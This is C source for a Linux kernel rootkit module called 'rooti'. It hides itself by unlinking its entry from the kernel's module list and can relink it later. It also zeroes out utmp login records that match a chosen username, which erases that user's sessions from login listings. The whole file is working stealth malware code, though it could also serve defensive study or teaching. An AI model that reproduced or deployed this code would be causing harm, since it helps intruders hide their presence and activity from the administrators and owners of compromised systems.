#include <linux/module.h>
#include <linux/types.h>
#include "utmp.h"
#include "hide.h"

/* 
 * Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
 * When hidden, the variable prev_module stores the address of the node that was previously
 * before this module in the list, otherwise it is NULL.
*/
bool rooti_hidden = false;
static struct list_head *prev_module = NULL;

/*
    Hides this rootkit by removing it from the kernel modules list.
*/
void rooti_hideme()
{
    rooti_hidden = true;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

/*
    Reveals this rootkit by re-adding it to the kernel modules list.
*/
void rooti_showme()
{
    rooti_hidden = false;
    list_add(&THIS_MODULE->list, prev_module);
    prev_module = NULL;
}

int rooti_filter_user_entry(char *user_buf, size_t count, char *name)
{
    char *kernel_buf = kmalloc(count, GFP_KERNEL);
    if (kernel_buf == NULL) {
        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
        return -ENOMEM;
    }
    int err = copy_from_user(kernel_buf, user_buf, count);
    if (err > 0) {
        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
        kfree(kernel_buf);
        return -EFAULT;
    }

    struct utmp *utmp_buf = (struct utmp *)kernel_buf;
    if (strncmp(utmp_buf->ut_user, name, UT_NAMESIZE) == 0) {
        // Match found, fill the buffer with zeros, marking it as invalid
        memset(kernel_buf, 0, count);
        err = copy_to_user(user_buf, kernel_buf, count);
        if (err > 0) {
            printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
            kfree(kernel_buf);
            return -EFAULT;
        }
    }

    kfree(kernel_buf);
    return 0;
}
